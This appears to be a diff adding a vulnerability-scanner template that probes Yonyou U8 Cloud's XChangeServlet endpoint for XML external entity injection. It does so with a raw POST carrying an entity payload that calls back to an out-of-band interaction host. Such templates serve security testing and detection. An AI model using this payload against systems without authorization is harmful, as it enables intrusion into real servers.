@@ -1,0 +1,24 @@
+id: yongyou-u8-cloud-XChangeServlet-xxe
+
+info:
+  name: yongyou-u8-cloud-XChangeServlet-xxe
+  author: yongyou-u8-cloud-XChangeServlet-xxe
+
+
+requests:
+  - raw:
+      - |     
+        POST /servlet/XChangeServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows 98; Win 9x 4.90; Trident/5.1)
+        Connection: close
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/"> %remote;]>'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
